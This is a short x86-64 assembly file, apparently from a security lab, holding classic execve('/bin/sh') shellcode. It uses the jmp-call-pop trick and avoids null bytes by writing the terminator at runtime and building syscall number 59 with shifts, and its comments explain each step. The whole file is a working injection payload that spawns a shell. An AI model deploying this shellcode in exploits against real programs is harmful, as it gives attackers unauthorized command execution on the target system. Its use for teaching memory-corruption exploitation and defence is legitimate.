section .text
  global _start
    _start:
	    BITS 64
	    jmp short two
    one:
 	    pop rbx           

      xor al, al
      mov [rbx+7],  al

 	    mov [rbx+8],  rbx  ; store rbx to memory at address rbx + 8
	    ;mov rax, 0x00      ; rax = 0
      xor rax, rax
 	    mov [rbx+16], rax  ; store rax to memory at address rbx + 16

      mov rdi, rbx       ; rdi = rbx
 	    lea rsi, [rbx+8]   ; rsi = rbx + 8    
      mov rdx, rax      ; rdx = 0
 	    mov rax, 0xFFFFFFFFFFFFFF3B        ; rax = 59
      shl rax, 56
      shr rax, 56
 	    syscall
     two:
        call one                                                                   
        db '/bin/sh', 0xFF ; The command string (terminated by a zero)
        db 'AAAAAAAA'      ; Place holder for argv[0] 
        db 'BBBBBBBB'      ; Place holder for argv[1]
